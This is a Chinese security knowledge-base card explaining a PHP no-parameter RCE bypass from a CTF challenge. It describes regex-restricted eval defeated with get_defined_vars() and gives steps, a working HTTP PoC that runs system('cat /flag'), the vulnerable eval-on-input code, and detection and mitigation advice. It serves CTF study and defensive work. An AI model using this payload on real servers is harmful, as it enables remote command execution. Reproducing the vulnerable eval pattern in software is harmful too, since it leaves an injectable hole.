---
id: web-php-rce-no-param-get-defined-vars
title: 无参数 RCE：正则只允许无参函数调用时用 get_defined_vars 取回外部参数
type: scenario
domain: web
path: web/php/rce
technique: php-no-parameter-rce
tags:
- php
- rce
- no-parameter
- get-defined-vars
- regex-bypass
- eval
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:47:34+08:00'
  notes: 已对照原文 gift.php 源码与图20/21核对：校验式 ; === preg_replace(/[^W]+(?R)?/, , m1xian) 与卡片一致；POST m1xian=eval(end(current(get_defined_vars()))); 配合 GET Pr0=system(cat /Th1s_1s_R2a1_flag) 成功回显 flag，与图21一致。卡片关于 current(get_defined_vars()) 通常取到 $_GET、end 取最后一个参数的说明与原文 exp 相符。原文未涉及版本区间。PoC 未在本机执行。
url: /docs/web/php/rce/web-php-rce-no-param-get-defined-vars/
draft: false
kb_aliases:
- 无参RCE
- get_defined_vars 无参数命令执行
- 只允许无参函数调用绕过
- eval(end(current(get_defined_vars())))
- CTF 无参 RCE
---

## 一句话结论

当代码用 `preg_replace('/[^\W]+\((?R)?\)/', '', $input)` 校验后要求只剩 `;` 才 `eval($input)` 时，用户输入只能由无参函数调用组成；但 `get_defined_vars()` 本身无参，能取回包含 `$_GET` 在内的全部变量，再用 `end(current(...))` 取出攻击者放在请求参数里的命令字符串，最终交给 `eval` 执行。

## 原理

- 正则 `[^\W]+\((?R)?\)` 的含义是：一个或多个单词字符（函数名）后跟 `(`，中间可选地递归匹配同样的“无参函数调用”，最后是 `)`。它只匹配不带参数的函数调用链，字符串、变量、运算符参数都不匹配。
- 校验逻辑把匹配到的函数调用全部替换为空，要求结果严格等于 `;`，因此常见 payload 如 `system('id')`、`$_GET[a]` 都无法通过。
- `get_defined_vars()` 没有参数，满足正则；它在当前作用域返回所有已定义变量的数组，其中包含 `$_GET`、`$_POST`、`$_COOKIE`、`$_SERVER` 等超全局变量。
- `current(get_defined_vars())` 取该数组中的第一个元素（通常是 `$_GET`），`end(...)` 取该数组的最后一个元素，即攻击者最后传入的 GET 参数值；这个值是普通字符串，不含函数调用语法，因此能通过正则。
- 最后 `eval(end(current(get_defined_vars())));` 把该字符串当 PHP 代码执行，从而绕过“无参”限制执行任意命令。
- 之所以成立：校验针对的是“语法形态”，而 `get_defined_vars()` 把“数据”从另一个通道（请求参数）带进了被求值的代码，检查器没有覆盖这种数据流向。

## 触发条件

- 存在 `eval($_POST[...])` / `eval($_GET[...])` 之类的动态求值入口；
- 求值前有只允许无参函数调用的正则校验（如上式），或类似的“禁止参数”限制；
- `get_defined_vars` 未被 `disable_functions` 禁用；
- 攻击者能同时控制一个请求参数（GET/POST/COOKIE）作为命令载体。

## 利用步骤

1. 确认校验规则：提交 `phpinfo();` 等会因正则不匹配被拒绝，提交 `phpinfo();` 形态之外的无参链才可能通过。
2. 用 `get_defined_vars()` 探测：先提交 `var_dump(get_defined_vars());` 观察是否被拦截（`var_dump` 带参数，通常不通过），改用无参链观察回显。
3. 在 GET/POST 中放置命令字符串（如 `Pr0=system('id')`）。
4. 提交 `eval(end(current(get_defined_vars())));` 作为被 eval 的输入，使取到的参数值被执行。
5. 若 `current()` 取到的不是期望的数组，改用 `next()`、`end()` 调整位置，或换 `getenv()`、`session_id()` 等无参来源。

## PoC

```http
POST /gift.php?Pr0=system('cat /flag') HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

m1xian=eval(end(current(get_defined_vars())));
```

服务端校验等价于：

```php
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_POST['m1xian'])) {
    eval($_POST['m1xian']);
}
```

## 变体与关联

- 数据来源变体：`get_defined_vars()`、`getenv()`（读环境变量）、`session_id()`、`localeconv()`、`scandir()` 等无参函数；配合 `current`/`next`/`end`/`array_rand` 取出可控值。
- 命令载体变体：GET/POST/COOKIE/Header 均可，取决于 `get_defined_vars()` 中哪个数组排在可控位置。
- 关联：[[web-php-rce-seacms-search-template-code-execution]]（另一类 eval/模板代码执行）；[[web-php-file-inclusion-filter-chain-fileless-rce]]（无文件 RCE）。
- 影响边界：本例执行系统命令并读取 flag；真实目标可写 WebShell 或回连，受 `disable_functions` 与 Web 进程权限限制。

## 检测与防御

- 检测：请求中出现 `get_defined_vars`、`end(current(`、`eval(` 等组合；同一请求同时携带命令字符串参数与 `eval(...get_defined_vars...)`；PHP 进程派生子进程执行 `cat`、`id` 等命令。
- 修复：不要对用户输入使用 `eval`；必须动态求值时使用严格白名单，而不是“只允许无参函数”的正则。
- 缓解：`disable_functions` 禁用 `get_defined_vars` 之外的危险函数并禁用命令执行；WAF 拦截 `get_defined_vars`/`end(current(` 等特征；Web 进程降权。
